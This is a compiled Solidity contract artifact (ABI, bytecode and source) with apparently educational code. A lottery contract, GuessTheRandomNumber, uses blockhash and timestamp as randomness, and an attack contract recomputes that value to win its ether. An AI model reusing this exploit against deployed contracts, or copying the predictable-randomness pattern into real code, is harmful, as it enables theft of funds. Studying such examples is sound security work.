{
  "contractName": "AttackGuessTheRandomNumber",
  "abi": [
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [
        {
          "internalType": "contract GuessTheRandomNumber",
          "name": "guessTheRandomNumber",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610328806100206000396000f3fe60806040526004361061002d5760003560e01c806312065fe014610039578063d018db3e1461006457610034565b3661003457005b600080fd5b34801561004557600080fd5b5061004e61008d565b60405161005b919061015a565b60405180910390f35b34801561007057600080fd5b5061008b600480360381019061008691906101ea565b610095565b005b600047905090565b60006001436100a49190610246565b40426040516020016100b79291906102c6565b6040516020818303038152906040528051906020012060001c90508173ffffffffffffffffffffffffffffffffffffffff16639189fec1826040518263ffffffff1660e01b815260040161010b919061015a565b600060405180830381600087803b15801561012557600080fd5b505af1158015610139573d6000803e3d6000fd5b505050505050565b6000819050919050565b61015481610141565b82525050565b600060208201905061016f600083018461014b565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101a58261017a565b9050919050565b60006101b78261019a565b9050919050565b6101c7816101ac565b81146101d257600080fd5b50565b6000813590506101e4816101be565b92915050565b600060208284031215610200576101ff610175565b5b600061020e848285016101d5565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061025182610141565b915061025c83610141565b92508282101561026f5761026e610217565b5b828203905092915050565b6000819050919050565b6000819050919050565b61029f61029a8261027a565b610284565b82525050565b6000819050919050565b6102c06102bb82610141565b6102a5565b82525050565b60006102d2828561028e565b6020820191506102e282846102af565b602082019150819050939250505056fea26469706673582212202bed4d347c1db7f7b458f7cf6b78a601f28e7fdd3085ee8387d43db16757811b64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"failed to send ether\");\n        }\n    }\n}\n\ncontract AttackGuessTheRandomNumber {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/GuessTheRandomNumber.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:36:45.235Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}